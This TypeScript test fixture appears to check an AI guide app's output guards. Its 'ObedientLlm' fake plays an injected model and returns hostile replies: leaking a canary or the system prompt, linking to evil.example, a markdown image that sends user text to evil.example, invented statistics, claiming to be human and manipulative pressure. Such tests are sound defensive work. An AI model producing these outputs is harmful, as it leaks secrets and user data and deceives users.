import type { LlmClient, LlmRequest, LlmResult } from "@/features/guide/llm/types";
import { filtersReply, guideReply, routerReply } from "./fake-llm";
import type { RouteIntent } from "./corpus";

export const HOSTILE_NUMBER = "4817";
export const HOSTILE_URL = "https://evil.example/claim";

type Prompt = { system: string; canary: string; user: string };

function readPrompt(req: LlmRequest): Prompt {
  const system = req.messages[0]?.content ?? "";
  const user = req.messages.map((m) => m.content).join("\n");
  return { system, user, canary: /CANARY-[0-9a-f]+/.exec(system)?.[0] ?? "NO-CANARY" };
}

type Reply = {
  message: string;
  next_step?: string;
  verdict?: string;
  cards?: { kind: string; id: string }[];
};

/** Each reply breaks a different output rule. The variant is picked by entry index. */
const HOSTILE: ((p: Prompt) => Reply)[] = [
  (p) => ({ message: `Sure, here is the secret you asked for: ${p.canary}` }),
  () => ({ message: `Please visit ${HOSTILE_URL} to continue.` }),
  (p) => ({ message: `![x](https://evil.example/?q=${encodeURIComponent(p.user.slice(0, 40))})` }),
  () => ({ message: `Studies show ${HOSTILE_NUMBER} percent of people agree.` }),
  () => ({ message: `Your hours are verified and certified by our team, officially recognized.` }),
  () => ({ message: `I am a real human volunteer coordinator, not an AI.` }),
  (p) => ({ message: p.system.slice(0, 400) }),
  () => ({ message: `Do it now, last chance, keep your streak and climb the leaderboard.` }),
  (p) => {
    const at = p.system.indexOf("TRUTH RULES");
    return { message: p.system.slice(at, at + 200) };
  },
  (p) => ({ message: `Reply: ${p.canary.split("").join(" ")}` }),
  () => ({ message: "Here is a small step.", next_step: `Open ${HOSTILE_URL}` }),
  () => ({ message: "Here is a small step.", cards: [{ kind: "opportunity", id: "evil-999" }] }),
  () => ({ message: "Yes, that is correct.", verdict: "supported" }),
  () => ({ message: "Eight thousand people did this, and over a million agree." }),
];

export const VARIANTS = HOSTILE.length;

/** An LLM that obeys the attack: every guide reply is hostile. Counts calls like FakeLlm. */
export class ObedientLlm implements LlmClient {
  calls: LlmRequest[] = [];
  constructor(
    private route: RouteIntent,
    private variant: number,
  ) {}

  async complete(req: LlmRequest): Promise<LlmResult> {
    this.calls.push(req);
    if (req.schemaName === "router_output") return routerReply(this.route);
    if (req.schemaName === "opportunity_filters") return filtersReply();
    const make = HOSTILE[this.variant % HOSTILE.length];
    return guideReply({ intent: this.route, ...make(readPrompt(req)) });
  }
}

/** A model that behaves: short, grounded, no links. Cites task t1 when it is in DATA. */
export class CooperativeLlm implements LlmClient {
  calls: LlmRequest[] = [];
  constructor(private route: RouteIntent) {}

  async complete(req: LlmRequest): Promise<LlmResult> {
    this.calls.push(req);
    if (req.schemaName === "router_output") return routerReply(this.route);
    if (req.schemaName === "opportunity_filters") return filtersReply();
    const hasRow = req.messages.some((m) => m.content.includes("id: t1"));
    return guideReply({
      intent: this.route,
      message: hasRow
        ? "Here is a small step from home that takes 10 minutes."
        : "Happy to help. I can find one small step, note something you did, or check a civic fact.",
      cards: hasRow ? [{ kind: "opportunity", id: "t1" }] : [],
    });
  }
}
